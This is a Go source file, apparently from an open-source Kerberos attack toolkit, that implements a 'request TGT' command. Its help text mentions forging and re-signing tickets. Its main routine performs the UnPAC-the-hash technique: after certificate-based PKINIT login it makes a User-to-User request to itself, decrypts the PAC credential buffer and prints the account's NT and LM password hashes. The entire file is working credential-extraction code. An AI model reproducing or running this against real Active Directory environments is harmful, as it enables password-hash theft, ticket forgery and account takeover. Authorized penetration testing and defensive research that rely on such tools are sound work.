// MIT License
//
// # Copyright (c) 2025 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"encoding/hex"
	"fmt"
	"os"
	"strings"

	"github.com/jfjallid/gokrb5/v8/iana/nametype"
	"github.com/jfjallid/gokrb5/v8/messages"
	"github.com/jfjallid/gokrb5/v8/pac"
	"github.com/jfjallid/gokrb5/v8/types"
)

var helpAskTGTOptions = `
    Usage: ` + os.Args[0] + ` --ask-tgt [options]
    ` + helpConnectionOptions + `
    options:
          --sign-nt <NT Hash>     Hex encoded NT Hash of key to sign or decrypt ticket with
          --sign-aes <AES key>    Hex encoded AES128/256 key to sign or decrypt ticket with
          --dump-all              Write all tickets to the CCache file
          --out-file <path>       Filename to write requested/forged ticket to (default creds.ccache)
          --inspect               Inspect content of requested, forged or parsed ticket. Requires --sign-nt or --sign-aes
          --request-rc4           Ask for RC4 encrypted encPart of KDC REP, not the actual ticket (default false)
          --unpac-hash           Extract NT hash from PAC via U2U after PKINIT authentication (requires --pfx)
          --krb5-conf <file>      Read krb5.conf file and use as config
          --duration <duration>   Ticket validity duration for crafted tickets. Format 8h, 30m. (default 10h)
`

func handleAskTGT(args *userArgs) (err error) {
	if args.signKeyNT != nil && args.signKeyAES != nil && args.inspect {
		return fmt.Errorf("choose ONE of --sign-nt and --sign-aes when inspecting tickets")
	}
	if args.signKeyNT == nil && args.signKeyAES == nil && args.inspect {
		return fmt.Errorf("must provide a decryption key with either --sign-nt or --sign-aes when inspecting a ticket")
	}
	if args.signKeyNT != nil && (len(args.signKeyNT) != 16) {
		return fmt.Errorf("invalid length of NT hash provided with --sign-nt argument")
	}
	if args.signKeyAES != nil {
		hashLen := len(args.signKeyAES)
		switch hashLen {
		case 16:
			args.signAes128Key = true
		case 32:
			args.signAes256Key = true
		default:
			return fmt.Errorf("invalid length of hex for --sign-aes: %d", hashLen)
		}
	}
	if args.inspect {
		if args.signAes128Key || args.signAes256Key {
			args.signingKey = args.signKeyAES
			args.signAes = true
		} else {
			args.signingKey = args.signKeyNT
		}
	}

	if args.unpacHash && args.pfxFile == "" {
		return fmt.Errorf("--unpac-hash requires PKINIT authentication (--pfx)")
	}

	// Verify that we have a TGT in the cache or request one
	tgt, sessionKey, err := args.c.GetTGT(args.userDomainUpper)
	if err != nil {
		log.Errorln(err)
		return
	}

	if !isFlagSet("out-file") {
		if args.ccacheFile != "" {
			// When requesting a TGT and KRB5CCNAME is specified, write the ticket to that file
			args.targetFile = args.ccacheFile
		} else {
			args.targetFile = fmt.Sprintf("%s.ccache", args.username)
		}
	}

	if args.inspect {
		err = inspectTicket(&tgt, args.signingKey, args.signAes)
		if err != nil {
			log.Errorln(err)
			return
		}
	}

	if args.unpacHash {
		err = doUnpacHash(args, tgt, sessionKey)
		if err != nil {
			log.Errorln(err)
			return
		}
	}

	err = saveToCCACHE(args, nil, nil, "krbtgt/"+args.userDomainUpper, args.dumpAllTickets)
	if err != nil {
		log.Errorln(err)
		return
	}

	return
}

func doUnpacHash(args *userArgs, tgt messages.Ticket, sessionKey types.EncryptionKey) (err error) {
	// Get the DH-derived key (AS reply key) from PKINIT
	dhKey := args.c.PKINITDerivedKey()
	if dhKey == nil {
		return fmt.Errorf("no PKINIT DH-derived key available; --unpac-hash requires PKINIT authentication")
	}

	// Build U2U TGS-REQ to self: sname is our own principal
	sname := types.NewPrincipalName(nametype.KRB_NT_UNKNOWN, args.username)
	tgsReq, err := messages.NewUser2UserTGSReq(
		args.c.Credentials.CName(),
		args.userDomainUpper,
		args.krbConf,
		tgt,
		sessionKey,
		sname,
		false,
		tgt, // Our own TGT as the additional ticket (U2U to self)
	)
	if err != nil {
		return fmt.Errorf("failed to build U2U TGS-REQ: %v", err)
	}

	log.Infoln("Sending U2U TGS-REQ to self for hash extraction")
	_, tgsRep, err := args.c.TGSExchange(tgsReq, args.userDomainUpper, tgt, sessionKey, 0)
	if err != nil {
		return fmt.Errorf("U2U TGS exchange failed: %v", err)
	}

	// Decrypt the returned ticket using the TGT session key (enc-tkt-in-skey)
	_, err = decryptTicket2(&tgsRep.Ticket, sessionKey)
	if err != nil {
		return fmt.Errorf("failed to decrypt U2U ticket: %v", err)
	}

	// Extract PAC without checksum verification (we don't have the service long-term key)
	u2uPac, err := getPac(&tgsRep.Ticket.DecryptedEncPart.AuthorizationData, sessionKey, false)
	if err != nil {
		return fmt.Errorf("failed to extract PAC from U2U ticket: %v", err)
	}

	// Decrypt PAC_CREDENTIAL_INFO using the DH-derived key (AS reply key)
	err = u2uPac.ProcessCredentialsInfo(*dhKey)
	if err != nil {
		return fmt.Errorf("failed to decrypt PAC credentials: %v", err)
	}

	if u2uPac.CredentialsInfo == nil {
		return fmt.Errorf("PAC does not contain credential info (PAC_CREDENTIAL_INFO buffer not present)")
	}

	// Extract NT hash from the credentials
	found := false
	for _, cred := range u2uPac.CredentialsInfo.PACCredentialData.Credentials {
		packageName := strings.ToUpper(cred.PackageName.Value)
		if packageName == "NTLM" {
			var ntlmCred pac.NTLMSupplementalCred
			err = ntlmCred.Unmarshal(cred.Credentials)
			if err != nil {
				return fmt.Errorf("failed to unmarshal NTLM supplemental credential: %v", err)
			}
			if ntlmCred.NTPassword != nil {
				fmt.Printf("NT Hash: %s\n", hex.EncodeToString(ntlmCred.NTPassword))
			}
			if ntlmCred.LMPassword != nil {
				fmt.Printf("LM Hash: %s\n", hex.EncodeToString(ntlmCred.LMPassword))
			}
			found = true
			break
		}
	}
	if !found {
		return fmt.Errorf("no NTLM credentials found in PAC_CREDENTIAL_INFO")
	}

	return nil
}
